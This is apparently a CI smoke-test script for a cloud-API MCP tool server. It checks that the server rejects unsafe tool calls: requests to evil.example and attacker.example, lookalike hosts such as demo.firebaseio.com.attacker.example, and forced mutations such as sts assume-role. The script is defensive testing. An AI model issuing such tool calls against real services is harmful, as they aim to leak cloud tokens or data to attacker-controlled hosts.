#!/usr/bin/env bash

set -euo pipefail

if [[ $# -ne 1 ]]; then
  echo "usage: protocol-smoke.sh /path/to/cloud-skills-mcp" >&2
  exit 2
fi

BINARY=$1
[[ -x "${BINARY}" ]] || { echo "binary is not executable: ${BINARY}" >&2; exit 2; }
command -v jq >/dev/null 2>&1 || { echo "jq is required" >&2; exit 2; }

RESPONSES=$(mktemp)
trap 'rm -f "${RESPONSES}"' EXIT

{
  printf '%s\n' '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-03-26","capabilities":{},"clientInfo":{"name":"ci-smoke","version":"1"}}}'
  printf '%s\n' '{"jsonrpc":"2.0","method":"notifications/initialized","params":{}}'
  printf '%s\n' '{"jsonrpc":"2.0","id":2,"method":"tools/list","params":{}}'
  printf '%s\n' '{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"aws_api_mutate","arguments":{"auth_scheme":"sigv4","service":"ec2","operation":"run-instances","region":"us-east-1","method":"POST","url":"https://ec2.us-east-1.amazonaws.com/","force":true}}}'
  printf '%s\n' '{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"gcp_api_read","arguments":{"method":"GET","url":"https://evil.example/v1/projects"}}}'
  printf '%s\n' '{"jsonrpc":"2.0","id":7,"method":"tools/call","params":{"name":"azure_api_read","arguments":{"method":"GET","url":"https://management.azure.com/subscriptions","audience":"https://attacker.example"}}}'
  printf '%s\n' '{"jsonrpc":"2.0","id":8,"method":"tools/call","params":{"name":"baiducloud_api_read","arguments":{"method":"GET","url":"https://bts.bj.baidubce.com/v1/forms","auth_version":"v2","service":"bts"}}}'
  printf '%s\n' '{"jsonrpc":"2.0","id":9,"method":"tools/call","params":{"name":"aws_api_mutate","arguments":{"service":"sts","operation":"assume-role","force":true}}}'
  printf '%s\n' '{"jsonrpc":"2.0","id":10,"method":"tools/call","params":{"name":"cloud_provider_status","arguments":{"provider":"aws"}}}'
  printf '%s\n' '{"jsonrpc":"2.0","id":11,"method":"tools/call","params":{"name":"gcp_api_read","arguments":{"auth_scheme":"firebase-sse","service":"firebase-database","operation":"Listen","method":"GET","url":"https://demo.firebaseio.com.attacker.example/messages.json","body":{"max_events":1,"timeout_seconds":5},"response_file":"/tmp/events.ndjson"}}}'
  printf '%s\n' '{"jsonrpc":"2.0","id":12,"method":"tools/call","params":{"name":"azure_api_read","arguments":{"auth_scheme":"eventgrid-mqtt-ws","service":"eventgrid","operation":"SubscribeMQTT","method":"GET","url":"wss://namespace.westus2.eventgrid.azure.net.attacker.example/mqtt","body":{"client_id":"observer","subscriptions":[{"topic_filter":"events/#","qos":1}],"keep_alive_seconds":30,"max_messages":1,"timeout_seconds":5},"response_file":"/tmp/eventgrid.ndjson"}}}'
  printf '%s\n' '{"jsonrpc":"2.0","id":13,"method":"tools/call","params":{"name":"azure_api_read","arguments":{"auth_scheme":"servicebus-amqp-ws","service":"servicebus","operation":"PeekMessages","method":"GET","url":"wss://namespace.servicebus.windows.net.attacker.example/\u0024servicebus/websocket","body":{"queue":"orders","max_messages":1,"timeout_seconds":5},"response_file":"/tmp/servicebus.ndjson"}}}'
  printf '%s\n' '{"jsonrpc":"2.0","id":14,"method":"tools/call","params":{"name":"azure_api_read","arguments":{"auth_scheme":"eventhubs-amqp-ws","service":"eventhubs","operation":"ReceiveEvents","method":"GET","url":"wss://namespace.servicebus.windows.net.attacker.example/\u0024servicebus/websocket","body":{"event_hub":"telemetry","partition_id":"0","start_position":{"earliest":true},"max_events":1,"timeout_seconds":5},"response_file":"/tmp/eventhubs.ndjson"}}}'
  printf '%s\n' '{"jsonrpc":"2.0","id":15,"method":"tools/call","params":{"name":"azure_api_read","arguments":{"auth_scheme":"realtime-ws","service":"openai","operation":"RealtimeResponse","method":"GET","url":"wss://nested.resource.openai.azure.com/openai/v1/realtime","parameters":{"model":"deployment"},"body":{"type":"response.create"},"response_file":"/tmp/realtime.ndjson"}}}'
  printf '%s\n' '{"jsonrpc":"2.0","id":16,"method":"tools/call","params":{"name":"azure_api_read","arguments":{"auth_scheme":"realtime-ws","service":"openai","operation":"RealtimeResponse","method":"GET","url":"wss://resource.openai.azure.us/openai/v1/realtime","parameters":{"model":"deployment"},"body":{"type":"response.create"},"response_file":"/tmp/realtime-gov.ndjson"}}}'
  printf '%s\n' '{"jsonrpc":"2.0","id":17,"method":"tools/call","params":{"name":"azure_api_read","arguments":{"auth_scheme":"realtime-ws","service":"openai","operation":"RealtimeResponse","method":"GET","url":"wss://resource.openai.azure.cn/openai/v1/realtime","parameters":{"model":"deployment"},"body":{"type":"response.create"},"response_file":"/tmp/realtime-cn.ndjson"}}}'
  printf '%s\n' '{"jsonrpc":"2.0","id":18,"method":"tools/call","params":{"name":"azure_api_read","arguments":{"auth_scheme":"voice-live-ws","service":"voice-live","operation":"VoiceLiveResponse","method":"GET","url":"wss://resource.services.ai.azure.us/voice-live/realtime","parameters":{"api-version":"2026-04-10","model":"gpt-realtime"},"body":{"type":"response.create"},"response_file":"/tmp/voice-live-gov.ndjson"}}}'
  printf '%s\n' '{"jsonrpc":"2.0","id":19,"method":"tools/call","params":{"name":"azure_api_read","arguments":{"auth_scheme":"voice-live-ws","service":"voice-live","operation":"VoiceLiveResponse","method":"GET","url":"wss://resource.cognitiveservices.azure.cn/voice-live/realtime","parameters":{"api-version":"2026-04-10","model":"gpt-realtime"},"body":{"type":"response.create"},"response_file":"/tmp/voice-live-cn.ndjson"}}}'
  printf '%s\n' '{"jsonrpc":"2.0","id":20,"method":"tools/call","params":{"name":"azure_api_read","arguments":{"auth_scheme":"realtime-ws","service":"openai","operation":"RealtimeResponse","method":"GET","url":"wss://privatelink.openai.azure.com/openai/v1/realtime","parameters":{"model":"deployment"},"body":{"type":"response.create"},"response_file":"/tmp/realtime-private-link.ndjson"}}}'
  printf '%s\n' '{"jsonrpc":"2.0","id":21,"method":"tools/call","params":{"name":"azure_api_read","arguments":{"auth_scheme":"voice-live-ws","service":"voice-live","operation":"VoiceLiveResponse","method":"GET","url":"wss://privatelink.services.ai.azure.com/voice-live/realtime","parameters":{"api-version":"2026-04-10","model":"gpt-realtime"},"body":{"type":"response.create"},"response_file":"/tmp/voice-live-private-link.ndjson"}}}'
  printf '%s\n' '{"jsonrpc":"2.0","id":22,"method":"tools/call","params":{"name":"azure_api_read","arguments":{"auth_scheme":"webpubsub-mqtt-ws","service":"webpubsub","operation":"SubscribeMQTT","method":"GET","url":"wss://privatelink.webpubsub.azure.com/clients/mqtt/hubs/chat","body":{"client_id":"Observer123","subscriptions":[{"topic_filter":"room/temperature","qos":1}],"keep_alive_seconds":30,"max_messages":1,"timeout_seconds":5},"response_file":"/tmp/webpubsub-private-link.ndjson"}}}'
  printf '%s\n' '{"jsonrpc":"2.0","id":23,"method":"tools/call","params":{"name":"alicloud_api_read","arguments":{"auth_scheme":"mq","service":"rocketmq","operation":"ConsumeMessages","method":"GET","url":"https://123456.mqrest.cn-hangzhou.aliyuncs.com/topics/orders/messages","parameters":{"consumer":"group-a","numOfMessages":1},"body":{"settlement":"release"},"response_file":"/tmp/rocketmq.ndjson"}}}'
} | env -i HOME=/nonexistent PATH=/usr/bin:/bin "${BINARY}" > "${RESPONSES}"

jq -e -s '
    . as $responses |
    (map(select(.id == 1))[0].result.serverInfo.version) == "0.4.0-dev" and
    (map(select(.id == 2))[0].result.tools | length) == 19 and
    ([map(select(.id == 2))[0].result.tools[] |
      select(.name | endswith("_api_mutate")) |
      (.inputSchema.required | index("force") != null)] | all) and
    ([map(select(.id == 2))[0].result.tools[] |
      select(.name | test("_api_(read|mutate)$")) |
      (.inputSchema.properties | has("method") and has("url") and has("body_file") and has("response_file") and has("audience") and has("auth_scheme") and has("region_set") and has("auth_version") and has("api_version") and has("payload_mode") and has("checksum_algorithm") and has("stream_chunk_bytes") and has("stream_interval_ms") and has("stream_user_id") and has("stream_format") and (has("arguments") | not))] | all) and
    (["aws","azure","gcp","alicloud","tencent","baiducloud"] -
      [map(select(.id == 2))[0].result.tools[].name | select(endswith("_api_read")) | sub("_api_read$"; "")]) == [] and
    (map(select(.id == 3))[0].result.isError == true) and
    (map(select(.id == 3))[0].result.content[0].text | contains("CLOUD_SKILLS_ALLOW_MUTATIONS")) and
    (map(select(.id == 4))[0].result.isError == true) and
    (map(select(.id == 4))[0].result.content[0].text | contains("endpoint allowlist")) and
    (map(select(.id == 7))[0].result.isError == true) and
    (map(select(.id == 7))[0].result.content[0].text | contains("identity allowlist")) and
    (map(select(.id == 8))[0].result.isError == true) and
    (map(select(.id == 8))[0].result.content[0].text | contains("requires a valid region")) and
    (map(select(.id == 9))[0].result.isError == true) and
    (map(select(.id == 9))[0].result.content[0].text | contains("credential issuance")) and
    ((map(select(.id == 10))[0].result.content[0].text | fromjson).credential_status == "unverified") and
    (map(select(.id == 11))[0].result.isError == true) and
    (map(select(.id == 11))[0].result.content[0].text | contains("official Realtime Database host")) and
    (map(select(.id == 12))[0].result.isError == true) and
    (map(select(.id == 12))[0].result.content[0].text | contains("operator-pinned custom domain")) and
    (map(select(.id == 13))[0].result.isError == true) and
    (map(select(.id == 13))[0].result.content[0].text | contains("namespace.servicebus.windows.net")) and
    (map(select(.id == 14))[0].result.isError == true) and
    (map(select(.id == 14))[0].result.content[0].text | contains("namespace.servicebus.windows.net")) and
    ([15,16,17] | all(. as $id |
      ($responses | map(select(.id == $id))[0].result.isError == true) and
      ($responses | map(select(.id == $id))[0].result.content[0].text | contains("exact public-cloud resource.openai.azure.com host")))) and
    ([18,19] | all(. as $id |
      ($responses | map(select(.id == $id))[0].result.isError == true) and
      ($responses | map(select(.id == $id))[0].result.content[0].text | contains("exact public-cloud single-label Foundry or Cognitive Services host")))) and
    ($responses | map(select(.id == 20))[0].result.isError == true) and
    ($responses | map(select(.id == 20))[0].result.content[0].text | contains("exact public-cloud resource.openai.azure.com host")) and
    ($responses | map(select(.id == 21))[0].result.isError == true) and
    ($responses | map(select(.id == 21))[0].result.content[0].text | contains("exact public-cloud single-label Foundry or Cognitive Services host")) and
    ($responses | map(select(.id == 22))[0].result.isError == true) and
    ($responses | map(select(.id == 22))[0].result.content[0].text | contains("resource.webpubsub.azure.com host")) and
    ($responses | map(select(.id == 23))[0].result.isError == true) and
    ($responses | map(select(.id == 23))[0].result.content[0].text | contains("mutation approval path"))
' "${RESPONSES}" >/dev/null

echo "protocol smoke: tool contract, mutation gate and pre-credential validation verified"
